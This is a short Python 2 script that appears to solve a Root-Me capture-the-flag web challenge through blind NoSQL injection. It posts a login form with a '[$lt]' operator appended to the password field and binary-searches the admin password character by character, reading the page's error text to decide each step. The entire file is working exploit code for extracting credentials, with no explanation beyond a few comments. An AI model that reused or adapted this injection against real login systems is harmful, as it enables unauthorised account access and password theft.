# noSQL.py
import urllib2
import urllib
URL = "http://challenge01.root-me.org/web-serveur/ch38/index.php"


def findPass(URL, userId = 'username', userValue = 'admin', passId = 'password', passValue = '', failText = 'Wrong username'):
	start = 32
	end = 144
	result = passValue
	while 1:
		tmpStart = start
		tmpEnd = end
		tmpSuccess = 0 	#id 
		tmpFail = 0
		#Binary search
		while 1:
			mid = (tmpStart + tmpEnd) / 2
			success = connectNoSql(URL, userId, userValue, passId + '[$lt]', result + chr(mid), failText)

			#print 's: ' + chr(tmpSuccess) + ' , f: ' + chr(tmpFail) + ' , m: ' + chr(mid) + ' , e: ' + chr(tmpEnd)

			if success == 1:
				tmpSuccess = mid
				tmpEnd = mid

			else:
				tmpFail = mid
				tmpStart = mid


			#found result
			if tmpSuccess == 32: 
				return result;
			#found char
			if (tmpSuccess - tmpFail == 1):
				result += chr(tmpFail)
				print result

				break



def connectNoSql(URL, userId = 'username', userValue = 'admin', passId = 'password', passValue = 'admin', failText = 'Wrong username'):

    data = {userId : userValue, passId : passValue}
    data = urllib.urlencode(data)
    req = urllib2.Request(URL,data)
    res = urllib2.urlopen(req)
    if res.read().find(failText)>10:
        return 0
    else:
        return 1







print findPass(URL, "login","admin", "pass", '', "Bad username")